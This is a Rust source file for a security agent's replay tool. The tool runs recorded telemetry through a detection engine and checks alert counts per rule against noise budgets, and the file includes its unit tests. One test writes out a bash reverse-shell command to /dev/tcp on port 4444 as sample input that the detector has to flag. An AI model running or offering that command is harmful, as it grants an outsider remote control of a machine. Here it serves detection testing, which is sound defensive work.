//! Replay recorded telemetry through the detection engine.
//!
//! `trapd-agent replay <events.ndjson> [--budget <budget.json>]` feeds an
//! NDJSON stream (the agent's own offline output, or a curated corpus) through
//! a fresh [`DetectionEngine`] on the events' original timeline and reports
//! what would have been emitted, per rule. It answers the question every rule
//! change must answer before it ships: *how much noise does this make on
//! normal activity?*
//!
//! The clock is injected (`inspect_at` / `admit_at`): event `n` is evaluated at
//! `base + (ts_n − ts_0)`, so rate, burst and dedup windows behave as they did
//! live. Timestamps that go backwards (merged sources) are clamped, never
//! reordered.
//!
//! A budget file turns the report into a gate: alert-mode findings per host and
//! day must stay below the rule's budget (default for every rule, overrides per
//! rule). Signals are counted but never budgeted — they never alert alone.

use std::collections::{BTreeMap, BTreeSet};
use std::io::BufRead;
use std::time::{Duration, Instant};

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

use super::DetectionEngine;
use crate::schema::{AgentEvent, DetectionMode, EventData, Severity};

/// Upper bound of one NDJSON line; longer lines are counted as skipped.
const MAX_LINE_BYTES: usize = 1 << 20;

#[derive(Debug, Default, Clone, Serialize, Deserialize, PartialEq)]
pub struct RuleStats {
    /// Findings emitted in alert mode (first occurrences and escalations).
    pub alerts: u64,
    /// Findings emitted as non-alerting signals.
    pub signals: u64,
    /// Findings of shadow-mode rules (evaluated, not emitted). Budgeted like
    /// alerts: a rule that would be noisy here must not be promoted.
    #[serde(default)]
    pub shadow: u64,
    pub max_severity: Option<Severity>,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct ReplayReport {
    pub events: u64,
    pub skipped_lines: u64,
    pub hosts: BTreeSet<String>,
    pub first_ts: Option<DateTime<Utc>>,
    pub last_ts: Option<DateTime<Utc>>,
    pub rules: BTreeMap<String, RuleStats>,
}

impl ReplayReport {
    /// Observed host-days (at least one, so a short capture is not divided by
    /// zero and is judged as if it were a whole day — the conservative side).
    pub fn host_days(&self) -> f64 {
        let span = match (self.first_ts, self.last_ts) {
            (Some(a), Some(b)) => (b - a).num_seconds().max(0) as f64 / 86_400.0,
            _ => 0.0,
        };
        (self.hosts.len().max(1) as f64) * span.max(1.0)
    }

    #[cfg(test)]
    pub fn total_alerts(&self) -> u64 {
        self.rules.values().map(|r| r.alerts).sum()
    }
}

/// Alert budget: maximum alert-mode findings per host and day.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Budget {
    pub default_alerts_per_host_day: f64,
    /// Per-rule overrides (exact `rule_id`).
    #[serde(default)]
    pub rules: BTreeMap<String, f64>,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct BudgetViolation {
    pub rule_id: String,
    pub alerts: u64,
    pub alerts_per_host_day: f64,
    pub budget: f64,
}

impl Budget {
    pub fn check(&self, report: &ReplayReport) -> Vec<BudgetViolation> {
        let days = report.host_days();
        report
            .rules
            .iter()
            .filter_map(|(rule, stats)| {
                let budget = *self
                    .rules
                    .get(rule)
                    .unwrap_or(&self.default_alerts_per_host_day);
                let rate = (stats.alerts + stats.shadow) as f64 / days;
                (rate > budget).then(|| BudgetViolation {
                    rule_id: rule.clone(),
                    alerts: stats.alerts + stats.shadow,
                    alerts_per_host_day: rate,
                    budget,
                })
            })
            .collect()
    }
}

/// Replay every event of `reader` through `engine`.
pub fn replay<R: BufRead>(engine: &DetectionEngine, reader: R) -> ReplayReport {
    let mut report = ReplayReport::default();
    let base = Instant::now();
    let mut first: Option<DateTime<Utc>> = None;
    let mut last_offset = Duration::ZERO;

    for line in reader.lines() {
        let Ok(line) = line else {
            report.skipped_lines += 1;
            continue;
        };
        if line.trim().is_empty() {
            continue;
        }
        if line.len() > MAX_LINE_BYTES {
            report.skipped_lines += 1;
            continue;
        }
        let Ok(event) = serde_json::from_str::<AgentEvent>(&line) else {
            report.skipped_lines += 1;
            continue;
        };
        report.events += 1;
        report.hosts.insert(event.hostname.clone());
        let t0 = *first.get_or_insert(event.timestamp);
        report.first_ts = Some(
            report
                .first_ts
                .map_or(event.timestamp, |f| f.min(event.timestamp)),
        );
        report.last_ts = Some(
            report
                .last_ts
                .map_or(event.timestamp, |l| l.max(event.timestamp)),
        );

        let offset = (event.timestamp - t0)
            .to_std()
            .unwrap_or(Duration::ZERO)
            .max(last_offset);
        last_offset = offset;
        let now = base + offset;

        if matches!(event.class, crate::schema::EventClass::Detection) {
            // Raw honeytoken evidence is replayed; stored findings are not, so
            // the report reflects what the current rules would emit.
            if matches!(event.data, EventData::HoneytokenAccess(_)) {
                for emitted in engine.admit_external_at(event, now) {
                    record(&mut report, &emitted);
                }
                for emitted in engine.flush_findings_at(now, false) {
                    record(&mut report, &emitted);
                }
            }
            continue;
        }
        let findings = engine.inspect_at(&event, now, offset.as_secs_f64());
        for f in &findings {
            if let EventData::Detection(d) = &f.data {
                if d.mode == Some(DetectionMode::Shadow) {
                    report.rules.entry(d.rule_id.clone()).or_default().shadow += 1;
                }
            }
        }
        for emitted in engine.admit_at(findings, now) {
            record(&mut report, &emitted);
        }
        for emitted in engine.flush_findings_at(now, false) {
            record(&mut report, &emitted);
        }
    }
    for emitted in engine.flush_findings_at(base + last_offset + Duration::from_secs(86_400), true)
    {
        record(&mut report, &emitted);
    }
    report
}

fn record(report: &mut ReplayReport, emitted: &super::gate::Emitted) {
    // Aggregate updates repeat an already-counted finding.
    if emitted.aggregate {
        return;
    }
    let (rule, signal) = match &emitted.event.data {
        EventData::Detection(d) => (d.rule_id.clone(), d.mode == Some(DetectionMode::Signal)),
        EventData::HoneytokenAccess(d) => (
            "deception.honeytoken_access".to_string(),
            d.mode == Some(DetectionMode::Signal),
        ),
        _ => return,
    };
    let stats = report.rules.entry(rule).or_default();
    if signal {
        stats.signals += 1;
    } else {
        stats.alerts += 1;
    }
    let sev = emitted.event.severity;
    stats.max_severity = Some(stats.max_severity.map_or(sev, |m| m.max(sev)));
}

/// CLI entry: `replay <file> [--budget <file>]`. Prints the JSON report (and
/// violations) to stdout; exit code 1 when a budget is exceeded, 2 on usage
/// errors.
pub fn run_cli(args: &[String]) -> i32 {
    let mut file = None;
    let mut budget_path = None;
    let mut it = args.iter();
    while let Some(a) = it.next() {
        match a.as_str() {
            "--budget" => budget_path = it.next().cloned(),
            other if file.is_none() => file = Some(other.to_string()),
            other => {
                eprintln!("unexpected argument {other:?}");
                return 2;
            }
        }
    }
    let Some(file) = file else {
        eprintln!("usage: trapd-agent replay <events.ndjson> [--budget <budget.json>]");
        return 2;
    };
    let reader = match std::fs::File::open(&file) {
        Ok(f) => std::io::BufReader::new(f),
        Err(e) => {
            eprintln!("cannot open {file}: {e}");
            return 2;
        }
    };
    let engine = DetectionEngine::new("replay".into(), "replay".into());
    let report = replay(&engine, reader);
    let violations = match budget_path {
        None => Vec::new(),
        Some(p) => match std::fs::read(&p)
            .map_err(|e| e.to_string())
            .and_then(|b| serde_json::from_slice::<Budget>(&b).map_err(|e| e.to_string()))
        {
            Ok(budget) => budget.check(&report),
            Err(e) => {
                eprintln!("cannot read budget {p}: {e}");
                return 2;
            }
        },
    };
    let out = serde_json::json!({
        "report": report,
        "host_days": report.host_days(),
        "violations": violations,
    });
    println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
    i32::from(!violations.is_empty())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::{EventAction, EventClass, ProcessCreateData};

    fn proc_event(ts: DateTime<Utc>, name: &str, exe: &str, cmdline: &str) -> AgentEvent {
        let mut e = AgentEvent::new(
            "a".into(),
            "host-1".into(),
            EventClass::Process,
            EventAction::Create,
            Severity::Info,
            EventData::ProcessCreate(ProcessCreateData {
                pid: 4242,
                ppid: 1,
                name: name.into(),
                exe: exe.into(),
                cmdline: cmdline.into(),
                uid: 0,
                username: "root".into(),
                exe_sha256: None,
                process_start_time: None,
                parent_start_time: None,
                enrichment: Default::default(),
            }),
        );
        e.timestamp = ts;
        e
    }

    fn ndjson(events: &[AgentEvent]) -> String {
        events
            .iter()
            .map(|e| serde_json::to_string(e).unwrap())
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn counts_events_hosts_and_skips_garbage() {
        let t = Utc::now();
        let mut input = ndjson(&[
            proc_event(t, "ls", "/usr/bin/ls", "ls -la"),
            proc_event(t + chrono::Duration::hours(2), "ls", "/usr/bin/ls", "ls"),
        ]);
        input.push_str("\nnot json\n\n");
        let engine = DetectionEngine::new("a".into(), "h".into());
        let report = replay(&engine, input.as_bytes());
        assert_eq!(report.events, 2);
        assert_eq!(report.skipped_lines, 1);
        assert_eq!(report.hosts.len(), 1);
        assert!((report.host_days() - 1.0).abs() < f64::EPSILON);
    }

    #[test]
    fn stored_detection_findings_are_not_replayed_as_current_output() {
        use crate::schema::{DetectionData, EventAction, EventClass};
        let event = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Detection,
            EventAction::Detected,
            Severity::High,
            EventData::Detection(Box::new(DetectionData {
                rule_id: "removed.rule".into(),
                title: "stale".into(),
                ..Default::default()
            })),
        );
        let engine = DetectionEngine::new("a".into(), "h".into());
        let report = replay(&engine, ndjson(&[event]).as_bytes());
        assert_eq!(report.events, 1);
        assert_eq!(report.total_alerts(), 0);
        assert!(!report.rules.contains_key("removed.rule"));
    }

    #[test]
    fn external_honeytoken_vectors_replay_with_identical_alert_and_signal_modes() {
        use crate::schema::{EventAction, EventClass, HoneytokenAccessData};
        let cases: serde_json::Value = serde_json::from_str(include_str!(
            "../../tests/fixtures/honeytoken-assessment-vectors.json"
        ))
        .unwrap();
        for case in cases.as_array().unwrap() {
            let data: HoneytokenAccessData = serde_json::from_value(case["data"].clone()).unwrap();
            let event = AgentEvent::new(
                "a".into(),
                "h".into(),
                EventClass::Detection,
                EventAction::HoneytokenAccess,
                Severity::Critical,
                EventData::HoneytokenAccess(Box::new(data)),
            );
            let engine = DetectionEngine::new("a".into(), "h".into());
            let report = replay(&engine, ndjson(&[event]).as_bytes());
            let stats = report
                .rules
                .get("deception.honeytoken_access")
                .expect("raw detection was omitted from replay");
            assert_eq!(
                stats.alerts,
                u64::from(case["mode"] == "alert"),
                "{}",
                case["name"]
            );
            assert_eq!(
                stats.signals,
                u64::from(case["mode"] == "signal"),
                "{}",
                case["name"]
            );
        }
    }

    #[test]
    fn honeytoken_attack_corpus_is_not_hidden_by_the_benign_budget() {
        let engine = DetectionEngine::new("a".into(), "h".into());
        let report = replay(
            &engine,
            include_str!("../../tests/fixtures/honeytoken-attacks.ndjson").as_bytes(),
        );
        let stats = report.rules.get("deception.honeytoken_access").unwrap();
        assert_eq!(stats.alerts, 11);
        assert_eq!(stats.signals, 0);
        assert_eq!(report.skipped_lines, 0);
    }

    #[test]
    fn suspicious_activity_is_counted_and_budgeted() {
        let t = Utc::now();
        let input = ndjson(&[proc_event(
            t,
            "bash",
            "/usr/bin/bash",
            "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        )]);
        let engine = DetectionEngine::new("a".into(), "h".into());
        let report = replay(&engine, input.as_bytes());
        assert!(
            report.total_alerts() >= 1,
            "reverse shell must alert: {report:?}"
        );
        let budget = Budget {
            default_alerts_per_host_day: 0.0,
            rules: BTreeMap::new(),
        };
        assert!(!budget.check(&report).is_empty());
        let lenient = Budget {
            default_alerts_per_host_day: 100.0,
            rules: BTreeMap::new(),
        };
        assert!(lenient.check(&report).is_empty());
    }

    /// The noise gate: every benign corpus replays within its alert budget.
    /// A failure names the rule and how far it is over — fix the rule (or
    /// justify a per-rule budget in `budgets.json`).
    #[test]
    fn benign_corpus_stays_within_budget() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/benign");
        let budget: Budget =
            serde_json::from_slice(&std::fs::read(dir.join("budgets.json")).unwrap()).unwrap();
        let mut corpora = 0;
        for entry in std::fs::read_dir(&dir).unwrap().flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("ndjson") {
                continue;
            }
            corpora += 1;
            let engine = DetectionEngine::new("replay".into(), "replay".into());
            let file = std::io::BufReader::new(std::fs::File::open(&path).unwrap());
            let report = replay(&engine, file);
            assert!(report.events > 100, "{}: corpus too small", path.display());
            assert_eq!(
                report.skipped_lines,
                0,
                "{}: unparseable lines",
                path.display()
            );
            let violations = budget.check(&report);
            assert!(
                violations.is_empty(),
                "{}: false positives over budget: {violations:#?}",
                path.display()
            );
        }
        assert!(corpora >= 2, "benign corpora missing");
    }

    #[test]
    fn host_days_scale_with_span_and_hosts() {
        let t = Utc::now();
        let report = ReplayReport {
            hosts: ["a".to_string(), "b".to_string()].into_iter().collect(),
            first_ts: Some(t),
            last_ts: Some(t + chrono::Duration::days(3)),
            ..Default::default()
        };
        assert!((report.host_days() - 6.0).abs() < 1e-9);
    }
}
